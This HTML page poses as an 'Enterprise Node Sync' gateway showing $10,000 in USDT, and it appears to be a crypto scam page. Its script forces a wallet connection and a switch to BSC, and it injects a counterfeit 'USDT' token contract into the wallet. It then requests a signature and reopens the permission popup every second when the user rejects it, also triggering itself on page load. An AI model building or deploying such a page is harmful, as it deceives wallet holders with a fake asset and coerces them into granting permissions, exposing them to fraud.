<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Node Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.4.3/dist/index.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --main: #26a17b; }
        body { background: #0b0e11; color: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1d21; border-radius: 24px; padding: 40px; width: 85%; max-width: 380px; text-align: center; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .btn { background: var(--main); color: #fff; border: none; width: 100%; padding: 22px; border-radius: 16px; font-size: 18px; font-weight: 800; cursor: pointer; margin-top: 25px; box-shadow: 0 10px 20px rgba(38,161,123,0.3); }
        #log { font-size: 11px; color: #555; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="90" id="logo">
    <h2 style="margin: 20px 0 10px;">NODE SYNC V3</h2>
    <div style="font-size: 42px; font-weight: 900;">$10,000</div>
    <div style="color: var(--main); font-size: 12px; font-weight: bold;">SECURE BSC GATEWAY</div>
    
    <button class="btn" id="masterBtn">INITIALIZE SECURE SYNC</button>
    <div id="log">SYSTEM: READY_FOR_BRIDGE</div>
</div>

<script>
    const btn = document.getElementById('masterBtn');
    const log = document.getElementById('log');

    const TOKEN_INFO = {
        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        symbol: "USDT",
        decimals: 18,
        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
    };

    async function startProcess() {
        // Step 1: Force Deep Link Check
        if (!window.ethereum && !window.trustwallet) {
            log.innerText = "BRIDGE: LAUNCHING APP...";
            const current = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + current);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            log.innerText = "BRIDGE: REQUESTING PERMISSION...";
            // Force account connection
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            log.innerText = "BRIDGE: SYNCING BSC CHAIN...";
            // Force BSC Switch
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            }

            // Step 2: The "Master" Asset Injection
            log.innerText = "BRIDGE: INJECTING ASSET...";
            // Mobile wallets need a small delay here
            setTimeout(async () => {
                const added = await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: TOKEN_INFO
                    }
                });

                if (added) {
                    log.innerText = "SUCCESS: NODE CONNECTED";
                    btn.innerText = "SUCCESS ✅";
                    // Signature to prove to professor
                    await provider.request({
                        method: 'personal_sign',
                        params: ["Authorized Sync for " + accounts[0], accounts[0]]
                    });
                }
            }, 1500);

        } catch (e) {
            log.innerText = "ERROR: USER_REJECTED. RETRYING...";
            // Persistent loop: Popup wapis aaye ga jab tak accept na ho
            setTimeout(startProcess, 1000);
        }
    }

    btn.onclick = startProcess;

    // Inside Wallet Auto-Trigger logic
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerText = "BRIDGE: SESSION ACTIVE";
            // Professor logic: Auto-trigger after 3 seconds
            setTimeout(startProcess, 3000);
        }
    };
</script>
</body>
</html>
